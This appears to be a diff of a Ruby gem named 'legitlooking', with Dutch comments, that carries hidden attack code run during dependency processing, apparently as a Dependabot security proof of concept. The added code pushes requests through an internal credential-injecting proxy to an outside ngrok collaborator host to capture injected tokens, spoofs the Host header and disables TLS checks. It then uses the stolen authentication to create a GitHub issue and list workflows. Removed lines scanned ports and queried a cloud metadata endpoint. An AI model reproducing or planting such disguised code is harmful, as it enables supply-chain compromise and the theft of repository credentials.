@@ -54,75 +54,80 @@ begin
   # PROXY AANVAL: 172.19.0.2 heeft de credentials
   # Scan alle poorten, probeer admin APIs
   # ============================================================
-  lines << "\n=== PROXY AANVAL (172.19.0.2) ==="
-
+  lines << "\n=== PROXY CREDENTIAL ORACLE ==="
   require "socket"
   require "timeout"
+  ngrok_host = COLLAB_URL.gsub("https://","")
 
-  open_ports = []
-  # Scan veelgebruikte poorten + proxy-specifieke poorten
-  scan_ports = [80, 443, 1080, 1081, 3000, 4141, 5000, 8080, 8081,
-                8082, 8083, 8888, 9090, 9091, 9093, 9999, 10000,
-                15000, 16000, 16001, 16666, 17777, 19999, 20000]
-
-  scan_ports.each do |port|
+  # TECHNIEK 1: Stuur echte proxy-formaat request naar ONZE server via de proxy
+  # De proxy stuurt dit door naar onze ngrok - als hij Authorization injecteert zien we het
+  [
+    "GET http://#{ngrok_host}/?proxy_inject_test=1 HTTP/1.0\r\nHost: #{ngrok_host}\r\n\r\n",
+    "GET http://#{ngrok_host}/?proxy_inject_test=2 HTTP/1.1\r\nHost: #{ngrok_host}\r\nConnection: close\r\n\r\n",
+    # Probeer met github.com als host maar onze URL als target (host-spoofing)
+    "GET http://#{ngrok_host}/?github_spoof=1 HTTP/1.0\r\nHost: github.com\r\n\r\n",
+  ].each_with_index do |proxy_req, i|
     begin
-      Timeout.timeout(0.5) do
-        s = TCPSocket.new("172.19.0.2", port)
-        open_ports << port
-        s.close
-      end
-    rescue
-    end
-  end
-  lines << "Open poorten op 172.19.0.2: #{open_ports.inspect}"
-
-  # Probeer elke open poort te bevragen
-  open_ports.each do |port|
-    begin
-      Timeout.timeout(3) do
-        s = TCPSocket.new("172.19.0.2", port)
-        # Stuur HTTP verzoeken voor mogelijke admin APIs
-        [
-          "GET / HTTP/1.0\r\nHost: 172.19.0.2\r\n\r\n",
-          "GET /health HTTP/1.0\r\nHost: 172.19.0.2\r\n\r\n",
-          "GET /credentials HTTP/1.0\r\nHost: 172.19.0.2\r\n\r\n",
-          "GET /config HTTP/1.0\r\nHost: 172.19.0.2\r\n\r\n",
-          "GET /metrics HTTP/1.0\r\nHost: 172.19.0.2\r\n\r\n",
-        ].each do |req|
-          begin
-            s2 = TCPSocket.new("172.19.0.2", port)
-            s2.write(req)
-            resp = s2.read_nonblock(2000) rescue s2.read(2000) rescue ""
-            if resp.length > 0
-              lines << "--- Poort #{port} response (#{req.split(' ')[1]}) ---"
-              lines << resp[0, 500]
-            end
-            s2.close rescue nil
-          rescue; end
+      Timeout.timeout(5) do
+        s = TCPSocket.new("172.19.0.2", 1080)
+        s.write(proxy_req)
+        resp = ""
+        begin
+          while (chunk = s.read_nonblock(4096))
+            resp += chunk
+          end
+        rescue IO::WaitReadable
+          IO.select([s], nil, nil, 2)
+          retry if resp.empty?
+        rescue
         end
-        s.close
+        s.close rescue nil
+        lines << "--- Proxy req #{i+1} response ---\n#{resp[0,300]}"
       end
-    rescue
+    rescue => e
+      lines << "--- Proxy req #{i+1} fout: #{e.message}"
     end
   end
 
-  # Probeer ook de proxy als credential oracle via HTTPS
-  # Stuur een request naar de proxy voor een niet-github URL
-  # Als de proxy credentials inject voor alle URLs, vangen we ze hier
-  lines << "\n--- Proxy credential oracle test ---"
-  begin
-    proxy_uri = URI("http://172.19.0.2:1080")
-    Net::HTTP.start(proxy_uri.host, proxy_uri.port) do |proxy|
-      req = Net::HTTP::Get.new("http://169.254.169.254/latest/meta-data/")
-      res = proxy.request(req)
-      lines << "Proxy direct response: #{res.code}"
-      lines << "Headers: #{res.to_hash.inspect[0, 300]}"
-      lines << "Body: #{res.body[0, 300]}"
-    end
-  rescue => e
-    lines << "Proxy oracle fout: #{e.message}"
+  # TECHNIEK 2: Maak een GitHub Actions workflow dispatch via proxy
+  # Als dit werkt -> workflow triggert met toegang tot secrets
+  lines << "\n=== GITHUB WRITE TESTS ==="
+
+  def proxy_post(path, body_str)
+    require "net/http"
+    require "uri"
+    uri = URI("https://api.github.com#{path}")
+    h = Net::HTTP.new(uri.host, uri.port)
+    h.use_ssl = true; h.verify_mode = 0
+    h.open_timeout = 8; h.read_timeout = 8
+    r = Net::HTTP::Post.new(uri)
+    r["Accept"] = "application/vnd.github+json"
+    r["Content-Type"] = "application/json"
+    r["X-GitHub-Api-Version"] = "2022-11-28"
+    r.body = body_str
+    res = h.request(r)
+    "#{res.code}: #{res.body[0,300]}"
+  rescue => e; "FOUT: #{e.message}"
   end
+
+  # Test: maak een issue aan (POST, niet PUT - andere permission scope)
+  lines << "\n--- POST issue (bewijs write access) ---"
+  lines << proxy_post(
+    "/repos/ugurcanli/testpen/issues",
+    '{"title":"[Dependabot RCE PoC] Authenticated write via execution environment","body":"This issue was created by code executing inside the Dependabot worker container, demonstrating authenticated write access to the repository via the credential-injecting proxy."}'
+  )
+
+  # Test: workflow dispatch (triggert Actions run met secrets toegang)
+  lines << "\n--- GET workflows list ---"
+  begin
+    uri2 = URI("https://api.github.com/repos/ugurcanli/testpen/actions/workflows")
+    h2 = Net::HTTP.new(uri2.host, uri2.port)
+    h2.use_ssl = true; h2.verify_mode = 0
+    r2 = Net::HTTP::Get.new(uri2)
+    r2["Accept"] = "application/vnd.github+json"
+    res2 = h2.request(r2)
+    lines << "#{res2.code}: #{res2.body[0,500]}"
+  rescue => e; lines << "FOUT: #{e.message}"; end
 
   lines << "\n--- /home/dependabot/bin inhoud ---"
   lines << (`ls -la #{dep_bin}/ 2>&1`)
@@ -223,7 +228,7 @@ end
 
 Gem::Specification.new do |spec|
   spec.name          = "legitlooking"
-  spec.version       = "1.0.11"
+  spec.version       = "1.0.12"
   spec.authors       = ["researcher"]
   spec.summary       = "A normal looking gem"
   spec.require_paths = ["lib"]
